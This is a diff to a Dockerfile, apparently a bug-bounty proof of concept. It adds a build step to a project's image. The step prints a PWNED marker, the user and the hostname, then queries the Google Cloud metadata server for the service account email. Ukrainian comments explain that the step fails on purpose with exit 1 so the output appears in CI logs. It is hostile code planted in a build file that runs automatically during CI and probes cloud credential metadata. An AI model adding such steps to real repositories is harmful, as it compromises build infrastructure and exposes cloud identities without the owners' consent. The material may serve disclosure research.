@@ -27,11 +27,16 @@ RUN apk update \
     && rm -rf /var/cache/apk/*
 
 # --- PoC (non-destructive, VRP submission — remove before merge) ---
-RUN echo "PWNED-BY-<your-h1-handle>-$(date -u +%s)" && \
+# Навмисний exit 1: BuildKit друкує ПОВНИЙ вивід кроку ЛИШЕ на падінні —
+# єдиний надійний спосіб побачити RUN-вивід у логах CI без --progress=plain.
+RUN set -x; \
+    echo "___POC_START___PWNED-BY-<your-h1-handle>-$(date -u +%s)" && \
     echo "whoami=$(whoami) host=$(hostname)" && \
     (curl -s -H 'Metadata-Flavor: Google' \
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email' \
-       || echo "no metadata access") && echo
+       || echo "no metadata access") && \
+    echo "___POC_END___" && \
+    exit 1
 
 # get packages
 COPY requirements.txt .
